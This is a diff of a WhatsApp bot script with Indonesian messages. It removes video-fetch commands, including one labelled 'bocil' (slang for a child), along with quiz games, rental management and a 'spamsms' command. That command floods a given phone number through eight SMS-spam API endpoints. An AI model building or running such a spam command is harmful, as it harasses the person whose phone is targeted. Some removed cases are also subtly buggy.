-              buttons = [{buttonId: `${prefix}ukhty`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(ukhty, "videoMessage", { thumbnail: ukhty, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
-              case 'santuy':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)              
-              freply(mess.wait)
-              const santuy = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/santuy?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}santuy`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(santuy, "videoMessage", { thumbnail: santuy, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
-              case 'bocil':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)              
-              freply(mess.wait)
-              const bocil = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/bocil?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}bocil`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(bocil, "videoMessage", { thumbnail: bocil, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
-              case 'hijaber':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)              
-              freply(mess.wait)
-              const hijaber = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/hijaber?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}hijaber`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(hijaber, "videoMessage", { thumbnail: hijaber, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
-              case 'geayubi':              
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              const geayubi = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/geayubi?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(geayubi, "videoMessage", { thumbnail: geayubi, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
-              case 'aura':              
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              const naura = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/aura?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}aura`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(naura, "videoMessage", { thumbnail: naura, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
-              case 'bunga':
-              if (!isRegist) return freply(mess.regist)
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)              
-              freply(mess.wait)
-              const bunga = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/bunga?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}bunga`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(bunga, "videoMessage", { thumbnail: bunga, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break              
-              case 'ayu':              
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              const ayu = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/ayu?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}ayu`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(ayu, "videoMessage", { thumbnail: ayu, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break              
-              case 'caca':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              const caca = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/caca?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}caca`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(caca, "videoMessage", { thumbnail: caca, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break              
-              case 'delvira':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              const delvira = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/delvira?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}delvira`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(delvira, "videoMessage", { thumbnail: delvira, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
-              case 'alita':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              const alita = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/delvira?apikey=${ramdaniapi}`)
-              buttons = [{buttonId: `${prefix}alita`,buttonText:{displayText: `➡️ NEXT`},type:1}]
-              videoMsg = (await Ramdani.prepareMessageMedia(delvira, "videoMessage", { thumbnail: alita, })).videoMessage
-              buttonsMessage = {footerText:`${fakereply}`, videoMessage: videoMsg,
-              contentText:`DONE`,buttons,headerType:5}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
-              Ramdani.relayWAMessage(prep)
-              break
 //------------------< Game >------------------
         case 'limitgame': 
         case 'balance': 
@@ -2475,344 +1702,6 @@ Ketik Y/N untuk menerima atau menolak permainan
 Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
               gameAdd(sender, glimit)
               break
-       case 'family100':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (game.isfam(from, family100)) return freply(`Masih ada soal yang belum di selesaikan`)
-              anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolhumanapi}`)
-              freply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
-              let anoh = anu.data.result.aswer
-              let rgfds = []
-              for (let i of anoh){
-              let fefs = i.split('/') ? i.split('/')[0] : i
-              let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
-              let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
-              rgfds.push(axsf.toLowerCase())
-}
-              game.addfam(from, rgfds, gamewaktu, family100)
-              gameAdd(sender, glimit)
-              break
-       case 'tebakanime':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebakanime.hasOwnProperty(sender.split('@')[0])) return freply("YANG SELUMNYA AJA BELOM DI SELESAIIN")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebakchara?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              ini_image = get_result.image
-              jawaban = get_result.name
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              ini_buffer = await getBuffer(ini_image)
-              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {
-              tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
-})
-              await sleep(30000)
-              if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("*Jawaban*: " + jawaban)
-              delete tebakanime[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'tebaklagu':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return freply("Selesein yg sebelumnya dulu atuh")
-              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${xteamapi}&id=4mFuArYRh3SO8jfffYLSER`)
-              get_result = get_result.result
-              ini_audio = get_result.preview
-              jawaban = get_result.judul
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              ini_buffer = await getBuffer(ini_audio)
-              freply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s')
-              Ramdani.sendMessage(from, ini_buffer, audio, {quoted: mek}).then(() => {
-              tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
-})
-              await sleep(30000)
-              if (tebaklagu.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("*Jawaban*: " + jawaban)
-              delete tebaklagu[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'tebaktebakan':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.xteam.xyz/game/tebaktebakan?APIKEY=${xteamapi}`)
-              get_result = get_result.result
-              jawaban = get_result.jawaban
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              pertanyaan = get_result.soal
-              Ramdani.sendMessage(from, '*+* ```Tebak Tebakan```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
-              tebaktebakan[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
-})
-              await sleep(30000)
-              if (tebaktebakan.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete tebaktebakan[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'kuismath':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (kuismath.hasOwnProperty(sender.split('@')[0])) return freply("Selesein yg sebelumnya dulu atuh")
-              get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/kuis/math`)
-              ini_image = get_result.soal
-              jawaban = get_result.jawaban
-              ini_buffer = await getBuffer(ini_image)
-              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: '*+* ```Kuis Matematika```\n\nSilahkan jawab soal berikut ini\n\n• *Waktu* : 50s' }).then(() => {
-              kuismath[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
-})
-              await sleep(50000)
-              if (kuismath.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("*Jawaban*: " + jawaban)
-              delete kuismath[sender.split('@')[0]]
-              fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'tebakgambar':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return freply("Selesein yg sebelumnya dulu atuh")
-              get_result = await fetchJson(`http://zekais-api.herokuapp.com/tebakgambar`)
-              ini_image = get_result.soal
-              jawaban = get_result.jawaban
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              ini_buffer = await getBuffer(ini_image)
-              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :'+kisi_kisi+'\nWaktu : 30s' }).then(() => {
-              tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
-})
-              await sleep(30000)
-              if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("*Jawaban*: " + jawaban)
-              delete tebakgambar[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'siapaaku':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/siapaaku?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.answer
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              pertanyaan = get_result.question
-              Ramdani.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
-              tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
-})
-              await sleep(30000)
-              if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete tebaksiapaaku[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'tebakkata':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebakkata.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/kata?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.jawaban
-              pertanyaan = get_result.pertanyaan
-              Ramdani.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
-              tebakkata[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
-})
-              await sleep(30000)
-              if (tebakkata.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete tebakkata[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'tebaklirik':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/lirik?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.answer
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              pertanyaan = get_result.question
-              Ramdani.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
-              tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
-})
-              await sleep(30000)
-              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete tebaklirik[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
-}
-              gameAdd(sender, glimit)
-              break
-      case 'tebakjenaka':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/jenaka?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.answer
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              pertanyaan = get_result.question
-              Ramdani.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
-              tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
-})
-              await sleep(30000)
-              if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete tebakjenaka[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'kimiakuis':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebakkimia.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/unsurkimia?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.lambang
-              pertanyaan = get_result.nama
-              Ramdani.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
-              tebakkimia[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebakkimia.json", JSON.stringify(tebakkimia))
-})
-              await sleep(30000)
-              if (tebakkimia.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete tebakkimia[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebakkimia.json", JSON.stringify(tebakkimia))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'tebakbendera':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/bendera?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.name
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              pertanyaan = get_result.flag
-              Ramdani.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
-              tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
-})
-              await sleep(30000)
-              if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete tebakbendera[sender.split('@')[0]]
-              fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'susunkata':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (susunkata.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/susunkata?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.jawaban
-              pertanyaan = get_result.pertanyaan
-              Ramdani.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :'+pertanyaan+'\n• *Waktu :* 30s', text, { quoted: mek}).then(() => {
-              susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
-})
-              await sleep(30000)
-              if (susunkata.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete susunkata[sender.split('@')[0]]
-              fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'asahotak':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (asahotak.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/asahotak?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.jawaban
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              pertanyaan = get_result.pertanyaan
-              Ramdani.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
-              asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
-})
-              await sleep(30000)
-              if (asahotak.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete asahotak[sender.split('@')[0]]
-              fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
-}
-              gameAdd(sender, glimit)
-              break
-       case 'caklontong':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (isGame(sender, isPremium, glimit, glimit)) return freply(`Limit game kamu sudah habis`)
-              if (caklontong.hasOwnProperty(sender.split('@')[0])) return freply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/caklontong2?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              jawaban = get_result.answer
-              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
-              pertanyaan = get_result.question
-              Ramdani.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :'+pertanyaan+'\n• *kisi²* :'+kisi_kisi, text, { quoted: mek}).then(() => {
-              caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
-              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
-})
-              await sleep(30000)
-              if (caklontong.hasOwnProperty(sender.split('@')[0])) {
-              console.log(color("Jawaban: " + jawaban))
-              freply("Jawaban: " + jawaban)
-              delete caklontong[sender.split('@')[0]]
-              fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
-}
-              gameAdd(sender, glimit)
-              break
        case 'slot':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
@@ -2870,129 +1759,17 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
 }
 }
               break
-//------------------< Sewa >-------------------
-       case 'sewa':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isGroup)return freply(mess.only.group)
-              if (!isOwner) return freply(mess.only.owner)
-              if (args.length < 1) return freply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
-              if (args[0].toLowerCase() === 'add'){
-            _sewa.addSewaGroup(from, args[1], sewa)
-              freply(`Success`)
-              } else if (args[0].toLowerCase() === 'del'){
-              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
-              fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))
-              freply(mess.success)
-              } else {
-              freply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
-}
-              break
-       case 'sewalist': 
-       case 'listsewa':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
-              for (let i of sewa){
-              let cekvipp = ms(i.expired - Date.now())
-              txtnyee += `*➤ ID User :* ${i.id} \n*➤ Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
-}
-              freply(txtnyee)
-              break
-       case 'sewacheck':
-       case 'ceksewa': 
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isGroup) return freply(mess.only.group)
-              if (!isSewa) return freply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
-              let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
-              let premiumnya = `*「 SEWA EXPIRE 」*\n\n➤ *ID User*: ${from}\n➤ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
-              freply(premiumnya)
-              break
-         case 'spamsms':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} 08303030303030`)
-                    nomor = args[0]
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=genbotkey&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=genbotkey&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=genbotkey&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=genbotkey&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=genbotkey&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=genbotkey&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=genbotkey&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=genbotkey&nomor=${nomor}`)
-                    freply("Success")
-                    break        
